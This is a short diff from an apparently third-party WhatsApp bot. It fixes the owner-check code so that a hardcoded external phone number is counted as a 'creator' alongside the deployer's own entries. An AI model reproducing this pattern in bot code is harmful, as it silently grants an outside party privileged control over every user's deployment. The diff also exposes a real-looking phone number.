@@ -340,11 +340,13 @@ BotActivityFilter(conn);
   }
   
   const udp = botNumber.split('@')[0];
-    const qadeerbrahvi = ('923300005253', '923300005253');
-    
-    const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
-    
-    let isCreator = [udp, ...qadeermd, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
+
+
+const qadeerbrahvi = ['923300005253', '923300005253'];
+
+const ownerFilev2 = JSON.parse(fs.readFileSync('./assets/sudo.json', 'utf-8'));  
+
+let isCreator = [udp, ...qadeerbrahvi, config.DEV + '@s.whatsapp.net', ...ownerFilev2]
     .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net') 
     .includes(mek.sender);
 	  
